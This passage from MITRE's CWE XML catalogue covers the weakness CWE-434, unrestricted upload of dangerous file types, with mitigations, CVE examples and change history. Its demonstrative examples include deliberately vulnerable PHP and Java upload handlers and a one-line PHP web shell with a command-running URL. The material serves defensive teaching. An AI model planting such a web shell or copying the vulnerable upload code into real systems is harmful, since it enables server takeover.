					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-10-14">Network Amplification</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="434" Name="Unrestricted Upload of File with Dangerous Type" Abstraction="Base" Structure="Simple" Status="Draft" Diagram="/data/images/CWE-434-Diagram.png">
         <Description>The product allows the upload or transfer of dangerous file types that are automatically processed within its environment.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="351" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="436" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="430" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
               <Description>This can be primary when there is no check for the file type at all.</Description>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Description>This can be resultant when use of double extensions (e.g. ".php.gif") bypasses a check.</Description>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Description>This can be resultant from client-side enforcement (CWE-602); some products will include web script in web clients to check the filename, without verifying on the server side.</Description>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="ASP.NET" Prevalence="Sometimes"/>
            <Language Name="PHP" Prevalence="Often"/>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Sometimes"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Unrestricted File Upload</Term>
               <Description>Used in vulnerability databases and elsewhere, but it is insufficiently precise. The phrase could be interpreted as the lack of restrictions on the size or number of uploaded files, which is a resource consumption issue.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Arbitrary code execution is possible if an uploaded file is interpreted and executed as code by the recipient. This is especially true for web-server extensions such as .asp and .php because these file types are often treated as automatically executable, even when file system permissions do not specify execution. For example, in Unix environments, programs typically cannot run unless the execute bit is set, but PHP programs may be executed by the web server without directly invoking them on the operating system.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Generate a new, unique filename for an uploaded file instead of using the user-supplied filename, so that no external input is used at all.[REF-422] [REF-423]</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Consider storing the uploaded files outside of the web document root entirely. Then, use other mechanisms to deliver the files dynamically. [REF-423]</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>For example, limiting filenames to alphanumeric characters can help to restrict the introduction of unintended file extensions.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Define a very limited set of allowable extensions and only generate filenames that end in these extensions. Consider the possibility of XSS (CWE-79) before allowing .html or .htm file types.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Ensure that only one extension is used in the filename. Some web servers, including some versions of Apache, may process files based on inner extensions so that "filename.php.gif" is fed to the PHP interpreter.[REF-422] [REF-423]</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When running on a web server that supports case-insensitive filenames, perform case-insensitive evaluations of the extensions that are provided.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Do not rely exclusively on sanity checks of file contents to ensure that the file is of the expected type and size. It may be possible for an attacker to hide code in some file segments that will still be executed by the server. For example, GIF images may contain a free-form comments field.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Do not rely exclusively on the MIME content type or filename attribute when determining how to render a file. Validating the MIME content type and ensuring that it matches the extension is only a partial solution.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code intends to allow a user to upload a picture to the web server. The HTML code that drives the form on the user end has an input field of type "file".</Intro_Text>
               <Example_Code Nature="Good" Language="HTML">
                  <xhtml:div>&lt;form action="upload_picture.php" method="post" enctype="multipart/form-data"&gt;<xhtml:br/>
                     <xhtml:br/>Choose a file to upload:<xhtml:br/>&lt;input type="file" name="filename"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Submit"/&gt;<xhtml:br/>
                     <xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Once submitted, the form above sends the file to upload_picture.php on the web server. PHP stores the file in a temporary location until it is retrieved (or discarded) by the server side code. In this example, the file is moved to a more permanent pictures/ directory.</Body_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>// Define the target location where the picture being</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// uploaded is going to be saved.</xhtml:i>
                     <xhtml:br/>$target = "pictures/" . basename($_FILES['uploadedfile']['name']);<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// Move the uploaded file to the new location.</xhtml:i>
                     <xhtml:br/>if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))<xhtml:br/>{<xhtml:div style="margin-left:1em;">echo "The picture has been successfully uploaded.";</xhtml:div>}<xhtml:br/>else<xhtml:br/>{<xhtml:div style="margin-left:1em;">echo "There was an error uploading the picture, please try again.";</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with the above code is that there is no check regarding type of file being uploaded. Assuming that pictures/ is available in the web document root, an attacker could upload a file with the name:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>malicious.php</xhtml:div>
               </Example_Code>
               <Body_Text>Since this filename ends in ".php" it can be executed by the web server. In the contents of this uploaded file, the attacker could use:</Body_Text>
               <Example_Code Nature="Attack" Language="PHP">
                  <xhtml:div>&lt;?php<xhtml:div style="margin-left:1em;">system($_GET['cmd']);</xhtml:div>
                     <xhtml:br/>?&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Once this file has been installed, the attacker can enter arbitrary commands to execute using a URL such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l</xhtml:div>
               </Example_Code>
               <Body_Text>which runs the "ls -l" command - or any other type of command that the attacker wants to specify.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-22">
               <Intro_Text>The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet.</Intro_Text>
               <Example_Code Nature="Good" Language="HTML">
                  <xhtml:div>&lt;form action="FileUploadServlet" method="post" enctype="multipart/form-data"&gt;<xhtml:br/>
                     <xhtml:br/>Choose a file to upload:<xhtml:br/>&lt;input type="file" name="filename"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Submit"/&gt;<xhtml:br/>
                     <xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class FileUploadServlet extends HttpServlet {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>...<xhtml:br/>
                           <xhtml:br/>protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:br/>
                           <xhtml:div style="margin-left:1em;">
                              <xhtml:div>response.setContentType("text/html");<xhtml:br/>PrintWriter out = response.getWriter();<xhtml:br/>String contentType = request.getContentType();<xhtml:br/>
                                 <xhtml:br/>// the starting position of the boundary header<xhtml:br/>int ind = contentType.indexOf("boundary=");<xhtml:br/>String boundary = contentType.substring(ind+9);<xhtml:br/>
                                 <xhtml:br/>String pLine = new String();<xhtml:br/>String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value<xhtml:br/>
                                 <xhtml:br/>// verify that content type is multipart form data<xhtml:br/>if (contentType != null &amp;&amp; contentType.indexOf("multipart/form-data") != -1) {<xhtml:br/>
                                 <xhtml:div style="margin-left:1em;">
                                    <xhtml:div>// extract the filename from the Http header<xhtml:br/>BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));<xhtml:br/>...<xhtml:br/>pLine = br.readLine();<xhtml:br/>String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));<xhtml:br/>...<xhtml:br/>
                                       <xhtml:br/>// output the file to the local upload directory<xhtml:br/>try {<xhtml:div style="margin-left:1em;">
                                          <xhtml:div>BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));<xhtml:br/>for (String line; (line=br.readLine())!=null; ) {<xhtml:div style="margin-left:1em;">if (line.indexOf(boundary) == -1) {<xhtml:div style="margin-left:1em;">bw.write(line);<xhtml:br/>bw.newLine();<xhtml:br/>bw.flush();</xhtml:div>}</xhtml:div>} //end of for loop<xhtml:br/>bw.close();</xhtml:div>
                                       </xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:br/>} catch (IOException ex) {...}<xhtml:br/>// output successful upload response HTML page</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>// output unsuccessful upload response HTML page<xhtml:br/>else<xhtml:br/>{...}</xhtml:div>
                           </xhtml:div>}<xhtml:div style="margin-left:1em;">...</xhtml:div>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not perform a check on the type of the file being uploaded (CWE-434). This could allow an attacker to upload any executable file or other file with malicious code.</Body_Text>
               <Body_Text>Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-23). Since the code does not check the filename that is provided in the header, an attacker can use "../" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2023-5227</Reference>
               <Description>PHP-based FAQ management app does not check the MIME type for uploaded images</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2023-5227</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0901</Reference>
               <Description>Web-based mail product stores ".shtml" attachments that could contain SSI</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0901</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1841</Reference>
               <Description>PHP upload does not restrict file types</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1841</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1868</Reference>
               <Description>upload and execution of .php file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1868</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1881</Reference>
               <Description>upload file with dangerous extension</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1881</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0254</Reference>
               <Description>program does not restrict file types</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0254</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2262</Reference>
               <Description>improper type checking of uploaded files</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2262</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4558</Reference>
               <Description>Double "php" extension leaves an active php extension in the generated filename.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4558</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6994</Reference>
               <Description>ASP program allows upload of .asp files by bypassing client-side checks</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6994</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3288</Reference>
               <Description>ASP file upload</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3288</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2428</Reference>
               <Description>ASP file upload</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-2428</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>File Processing</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Unrestricted File Upload</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Malicious File Execution</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-434</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="1"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-422"/>
            <Reference External_Reference_ID="REF-423"/>
            <Reference External_Reference_ID="REF-424"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;File Uploading&#34;, Page 1068"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-434"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>This can have a chaining relationship with incomplete denylist / permissive allowlist errors when the product tries, but fails, to properly limit which types of files are allowed (CWE-183, CWE-184).</xhtml:p>
               <xhtml:p>This can also overlap multiple interpretation errors for intermediaries, e.g. anti-virus products that do not remove or quarantine attachments with certain file extensions that can be processed by client systems.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Functional_Areas, Likelihood_of_Exploit, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>converted from Compound_Element to Weakness</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Name, Other_Notes, Potential_Mitigations, References, Related_Attack_Patterns, Relationship_Notes, Relationships, Type, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated References, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Weakness_Ordinalities</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
